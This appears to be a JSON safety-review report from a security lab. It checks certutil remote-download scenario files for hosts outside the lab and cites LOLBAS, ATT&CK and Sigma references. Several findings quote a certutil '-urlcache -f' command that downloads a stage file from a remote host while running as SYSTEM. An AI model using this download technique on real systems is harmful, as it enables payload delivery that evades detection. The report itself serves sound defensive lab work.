@@ -1,0 +1,81 @@
+{
+  "schema_version": 1,
+  "rule": "SAFETY RULE 1 at design time - no scenario targets anything outside the lab",
+  "target": "lol/techniques/certutil-remote-download/verification",
+  "files_checked": [
+    "/home/operator/lab-workspace/attack-tool-analysis/lol/techniques/certutil-remote-download/verification/scenarios.md",
+    "/home/operator/lab-workspace/attack-tool-analysis/lol/techniques/certutil-remote-download/verification/README.md",
+    "/home/operator/lab-workspace/attack-tool-analysis/lol/techniques/certutil-remote-download/verification/verification.json"
+  ],
+  "scope_declaration_present": true,
+  "severity_counts": {
+    "high": 4,
+    "info": 3
+  },
+  "findings": [
+    {
+      "severity": "high",
+      "check": "external-host",
+      "file": "scenarios.md",
+      "line": 102,
+      "detail": "external host certutil.lab",
+      "why": "SAFETY RULE 1: if the run contacts this host, the scenario is rejected. Re-host the payload on Kali (VM 100).",
+      "evidence": "C:\\Windows\\System32\\certutil.exe -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\\lab\\https-stage.txt"
+    },
+    {
+      "severity": "info",
+      "check": "citation-host",
+      "file": "scenarios.md",
+      "line": 134,
+      "detail": "cited host lolbas-project.github.io",
+      "why": "a cited write-up is fine; a host the run would CONTACT is not. Confirm this appears only as a reference.",
+      "evidence": "References: [LOLBAS Certutil](https://lolbas-project.github.io/lolbas/Binaries/Certutil/),"
+    },
+    {
+      "severity": "info",
+      "check": "citation-host",
+      "file": "scenarios.md",
+      "line": 135,
+      "detail": "cited host attack.mitre.org",
+      "why": "a cited write-up is fine; a host the run would CONTACT is not. Confirm this appears only as a reference.",
+      "evidence": "[ATT&CK T1105](https://attack.mitre.org/techniques/T1105/),"
+    },
+    {
+      "severity": "info",
+      "check": "citation-host",
+      "file": "scenarios.md",
+      "line": 136,
+      "detail": "cited host github.com",
+      "why": "a cited write-up is fine; a host the run would CONTACT is not. Confirm this appears only as a reference.",
+      "evidence": "[SigmaHQ Certutil Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_download.yml),"
+    },
+    {
+      "severity": "high",
+      "check": "external-host",
+      "file": "scenarios.md",
+      "line": 137,
+      "detail": "external host cybersecuritynews.com",
+      "why": "SAFETY RULE 1: if the run contacts this host, the scenario is rejected. Re-host the payload on Kali (VM 100).",
+      "evidence": "and the cited [ActiveMQ incident report](https://cybersecuritynews.com/threat-actors-exploit-apache-activemq-server-vulnerability/)."
+    },
+    {
+      "severity": "high",
+      "check": "external-host",
+      "file": "README.md",
+      "line": 14,
+      "detail": "external host certutil.lab",
+      "why": "SAFETY RULE 1: if the run contacts this host, the scenario is rejected. Re-host the payload on Kali (VM 100).",
+      "evidence": "| HTTPS | `certutil.exe -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\\lab\\https-stage.txt` | 2 EID 3; 2 TLS; 1 x509 | cache + destination | trust/API state | certutil EID 1 | PowerShell "
+    },
+    {
+      "severity": "high",
+      "check": "external-host",
+      "file": "verification.json",
+      "line": 80,
+      "detail": "external host certutil.lab",
+      "why": "SAFETY RULE 1: if the run contacts this host, the scenario is rejected. Re-host the payload on Kali (VM 100).",
+      "evidence": "\"command\": {\"invocation\": \"C:\\\\Windows\\\\System32\\\\certutil.exe -urlcache -f https://certutil.lab:18443/benign-stage.txt C:\\\\lab\\\\https-stage.txt\", \"account\": \"NT AUTHORITY\\\\SYSTEM\", \"started_at\": \"202"
+    }
+  ],
+  "verdict": "REVIEW"
+}
